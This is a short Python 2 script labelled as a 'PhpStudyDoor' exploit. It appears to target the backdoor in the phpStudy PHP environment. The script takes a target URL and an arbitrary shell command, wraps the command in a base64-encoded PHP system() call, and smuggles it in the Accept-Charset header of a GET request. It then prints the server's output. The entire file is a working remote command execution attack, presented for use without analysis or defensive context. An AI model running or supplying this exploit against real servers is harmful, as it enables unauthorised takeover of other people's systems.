#PhpStudyDoor Exploit
#Author: K8gege
#Date: 20190926
import socket
import sys
import requests
import base64
url = sys.argv[1]
cmd = sys.argv[2]
payload = base64.b64encode('echo system("'+cmd+'");')

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
	'Accept-Encoding':'gzip,deflate',
	'Accept-Charset':payload
}

html = requests.get(url,headers=headers,verify=False,timeout=5)
print html.text